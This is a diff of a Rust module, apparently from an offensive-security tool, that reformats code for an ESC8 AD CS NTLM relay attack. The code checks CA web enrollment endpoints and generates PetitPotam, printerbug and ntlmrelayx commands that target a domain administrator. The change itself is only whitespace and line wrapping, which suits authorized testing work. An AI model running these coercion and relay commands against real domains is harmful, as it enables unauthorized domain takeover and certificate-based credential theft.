@@ -35,10 +35,7 @@ pub struct Esc8RelayTarget {
 }
 
 impl Esc8RelayTarget {
-    pub fn new(
-        ca_server: impl Into<String>,
-        template: impl Into<String>,
-    ) -> Self {
+    pub fn new(ca_server: impl Into<String>, template: impl Into<String>) -> Self {
         Self {
             ca_server: ca_server.into(),
             template: template.into(),
@@ -109,7 +106,11 @@ impl Esc8AttackConfig {
     pub async fn check_endpoint_reachable(&self) -> Result<EndpointCheckResult> {
         let url = format!(
             "{}://{}/certsrv/",
-            if self.target.use_https { "https" } else { "http" },
+            if self.target.use_https {
+                "https"
+            } else {
+                "http"
+            },
             self.target.ca_server
         );
 
@@ -198,10 +199,7 @@ impl Esc8AttackConfig {
         );
 
         // Coercion commands
-        let petitpotam_cmd = format!(
-            "python3 PetitPotam.py {} <TARGET_DC_IP>",
-            self.listener_ip
-        );
+        let petitpotam_cmd = format!("python3 PetitPotam.py {} <TARGET_DC_IP>", self.listener_ip);
 
         let printerbug_cmd = format!(
             "python3 printerbug.py '{}'/username:password@<TARGET_DC> {}",
@@ -243,7 +241,10 @@ impl Esc8AttackConfig {
             template = self.target.template,
             listener = self.listener_ip,
             port = self.listener_port,
-            upn_line = self.target.target_upn.as_ref()
+            upn_line = self
+                .target
+                .target_upn
+                .as_ref()
                 .map(|u| format!("Target UPN: {}", u))
                 .unwrap_or_default(),
             ntlmrelayx = ntlmrelayx_cmd,
@@ -297,8 +298,8 @@ mod tests {
 
     #[test]
     fn test_relay_target_creation() {
-        let target = Esc8RelayTarget::new("ca.corp.local", "Machine")
-            .with_upn("administrator@corp.local");
+        let target =
+            Esc8RelayTarget::new("ca.corp.local", "Machine").with_upn("administrator@corp.local");
         assert_eq!(target.ca_server, "ca.corp.local");
         assert_eq!(target.template, "Machine");
         assert_eq!(
@@ -333,8 +334,7 @@ mod tests {
 
     #[test]
     fn test_exploit_commands() {
-        let target = Esc8RelayTarget::new("ca.corp.local", "Machine")
-            .with_upn("admin@corp.local");
+        let target = Esc8RelayTarget::new("ca.corp.local", "Machine").with_upn("admin@corp.local");
         let config = Esc8AttackConfig::new("10.0.0.5", target, "corp.local");
         let cmds = config.generate_exploit_commands().unwrap();
 
